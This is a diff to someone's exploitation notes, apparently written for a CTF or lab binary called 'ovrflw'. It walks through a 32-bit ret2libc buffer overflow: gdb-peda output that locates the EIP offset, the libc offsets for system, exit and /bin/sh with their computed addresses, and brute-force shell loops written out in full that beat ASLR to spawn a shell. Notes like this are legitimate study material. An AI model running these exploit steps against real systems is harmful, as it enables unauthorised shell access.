@@ -9,12 +9,73 @@ step 2:- checking if aslr is enabled or not
          [-] checking
          check ASLR on the host  by checking from /proc/sys/kernel/randomize_va_space
          and looking its output
+         [-]to check at what offset buffer overflows
+         gdb -q ./ovrflw
+        Reading symbols from ./ovrflw...(no debugging symbols found)...done.
+        gdb-peda$pattern_create 500
+        'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA'
+        gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA'
+        [----------------------------------registers-----------------------------------]
+        EAX: 0x0 
+        EBX: 0x0 
+        ECX: 0xffffd3e0 ("As6A")
+        EDX: 0xffffd0fc ("As6A")
+        ESI: 0xf7f99000 --> 0x1d9d6c 
+        EDI: 0xf7f99000 --> 0x1d9d6c 
+        EBP: 0x6941414d ('MAAi')
+        ESP: 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAAx...)
+        EIP: 0x41384141 ('AA8A')
+        EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+        [-------------------------------------code-------------------------------------]
+        Invalid $PC address: 0x41384141
+        [------------------------------------stack-------------------------------------]
+        0000| 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAA"...)
+        0004| 0xffffcf84 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAx"...)
+        0008| 0xffffcf88 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyz"...)
+        0012| 0xffffcf8c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%"...)
+        0016| 0xffffcf90 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%A"...)
+        0020| 0xffffcf94 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA"...)
+        0024| 0xffffcf98 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%"...)
+        0028| 0xffffcf9c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%C"...)
+        [------------------------------------------------------------------------------]
+        Legend: code, data, rodata, value
+        Stopped reason: SIGSEGV
+        0x41384141 in ?? ()
+        at 0x41384141 it overflows
+        I see that the program crashed at 0x41384141 from the message at the bottom. I’ll see this same value in the EIP register if I look up a bit:
+        EIP: 0x41384141 ('AA8A')
+        I can feed that value, either as hex or as a string, into pattern_offset to get the offset in my buffer to the address that overwrites EIP:
+        gdb-peda$ pattern_offset AA8A
+        AA8A found at offset: 112
+        gdb-peda$ pattern_offset 0x41384141
+        1094205761 found at offset: 112
+        I can show this works by running:
+        gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`
+        That will input 112 As, and then 4 Bs. It crashes:
+        Stopped reason: SIGSEGV
+        0x42424242 in ?? ()
+        The address is 0x42424242, which is BBBB.
          [-]to print the shared library required by the program use ldd cmommand
           ldd filename 
           The command ​ ldd /usr/local/bin/overflw | grep libc​ will get the libc address of 
           the binary as well as the path to the libc library
          eg- ldd /usr/local/bin/ovrflw | grep libc (to grep only libc library grep libc is used)
              libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b1000)
+         [-]to  get offsets for system, exit,
+         readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
+         139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+         1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+         offest for system is 00040310 and for exit is 00033260
+         [-]to  get offsets for bin/sh:
+         strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
+         162bac /bin/sh
+         164b10 /bin/csh
+         offset for bin/sh is 162bac
+         
+         [-]For this libc base
+         exit: 0xb75f8000+0x33260 = 0xB762B260
+         system: 0xb75f8000+0x40310 = 0xB7638310
+         /bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
 step 3:-checking type of buffer overflow attack you have to do 
         
         [-]checksec filename (checksec will print the properties of file/program/executable)
@@ -34,6 +95,12 @@ step 3:-checking type of buffer overflow attack you have to do
                       AAAAAAAAAAAA      |    RET     |        SHELLCODE           
         |-------------------|-----------|------------|---------------------------| 
                          args              EBP         EIP 
+        I’m going to overflow such my buffer goes [JUNK] + SYSTEM (ret address overwrite) + “/bin/sh” (args)
+        system adress :-0xB7638310
+        bin/sh address:-0xB775ABAC
+        while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + 
+         "\xac\xab\x75\xb7"'); done
+        this is done in loop as aslr is active 
         
         
         2:- when NX is enabled
@@ -42,6 +109,15 @@ step 3:-checking type of buffer overflow attack you have to do
         |            buffer             |   system   |   fake_ret   |   /bin/sh  | 
         |-------------------------------|------------|--------------|------------| 
                      args                  EBP           EIP
-                     
+        
+        I’m going to overflow such my buffer goes [JUNK] + SYSTEM (ret address overwrite) +EXIT (next return address) + “/bin/sh” (args)
+        system adress :-0xB7638310
+        exit address :-0xB762B260
+        bin/sh address:-0xB775ABAC
+        while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + 
+        "\x60\xb2\x62\xb7 " + "\xac\xab\x75\xb7"'); done
+        this is done in loop as aslr is active 
+         
+        
                      
                      
